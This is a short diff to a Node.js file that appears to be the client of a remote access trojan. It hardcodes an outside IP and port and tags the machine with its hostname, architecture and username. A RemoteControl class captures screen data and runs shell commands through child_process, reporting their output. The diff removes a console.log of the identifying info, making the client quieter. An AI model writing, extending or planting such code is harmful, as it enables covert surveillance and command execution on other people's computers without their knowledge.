@@ -5,10 +5,9 @@ const child_process = require("child_process");
 const os = require("os");
 
 let info = { host: "3.80.100.30", port: 3001, id: os.hostname() + "|" + os.arch() + "|" + os.userInfo().username }
-console.log( info );
+
 
 class RemoteControl {
-
     getScreenData = async (data) => {
         let pr = new Promise((resolve, reject) => {
             (async () => {
@@ -46,7 +45,7 @@ class RemoteControl {
                 else if (stderr) {
                     data["cmd"] = "stderr: " + stderr;
                 }
-                else{
+                else {
                     data["cmd"] = stdout;
                 }
 
